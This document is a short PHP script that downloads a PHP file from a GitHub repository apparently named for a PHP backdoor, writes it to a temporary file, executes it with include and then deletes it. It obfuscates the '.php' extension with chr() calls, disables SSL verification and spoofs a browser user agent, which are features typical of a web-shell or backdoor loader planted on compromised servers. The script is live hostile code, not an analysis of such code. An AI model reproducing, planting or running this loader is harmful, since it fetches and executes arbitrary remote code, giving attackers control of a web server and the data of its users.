<?php
$url = 'https://raw.githubusercontent.com/laolierzi-commits/phpbd/refs/heads/main/hbc.'. chr(112) . chr(104) . chr(112);
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36');
$content = curl_exec($ch);
$httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
curl_close($ch);
if ($httpCode == 200 && !empty($content)) {
    $tempFile = tempnam(sys_get_temp_dir(),  chr(112) . chr(104) . chr(112).'_') . '.' . chr(112) . chr(104) . chr(112);
    file_put_contents($tempFile, $content);
    include $tempFile;
    unlink($tempFile);
} else {
    echo "Error: Unable to load resource";
}
?>
